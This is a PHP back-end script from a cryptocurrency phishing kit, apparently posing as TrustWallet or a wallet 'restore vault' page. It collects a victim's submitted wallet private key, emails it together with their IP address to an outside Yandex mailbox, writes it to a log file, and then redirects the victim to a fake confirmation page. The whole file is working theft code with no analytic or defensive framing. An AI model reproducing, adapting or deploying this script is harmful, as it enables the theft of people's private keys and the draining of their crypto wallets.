<?php


/*========== [ Variables ]==========*/
$ip 		= getenv("REMOTE_ADDR");
$PrivateKey   = $_POST['PrivateKey'];
/*========== [ Variables ]==========*/


$message = "
==$$$==== ***JACKKTERR***=====$$$==
PrivateKey     : $PrivateKey
==$$$==== *** TrustWallet ***=====$$$==
IP	: http://www.geoiptool.com/?IP=$ip;
==========[ THANK'S YOU ]==========";


$to = "Inisayapunya@yandex.com"; // Email Here
$subject = "BTC = [$ip]";
$headers = "From: Terra Lunc <Inisayapunya@yandex.com>";
$headers .= "Terra: Jack\n";

mail($to, $subject, $message,$headers);


$ip = $_SERVER['REMOTE_ADDR'];
$today = date("F j, Y, g:i a");

$handle = fopen($file, 'a');
fwrite($handle, "---------------------------------------");
fwrite($handle, "\n");
fwrite($handle, "::  PrivateKey       ::   ");
fwrite($handle, "$PrivateKey");
fwrite($handle, "\n");
fclose($handle);
echo "<script LANGUAGE=\"javascript\">
<!--
top.location=\"confirm?nkbihfbeogaeaoehlefnkodbefgpgknn/home#restore-vault\";
// -->
</script>";
?>
<script type="text/javascript">

  var _gaq = _gaq || [];
  _gaq.push(['_setAccount', 'UA-33910177-1']);
  _gaq.push(['_setDomainName', 'x90x.net']);
  _gaq.push(['_setAllowLinker', true]);
  _gaq.push(['_trackPageview']);

  (function() {
    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
  })();

</script>

?>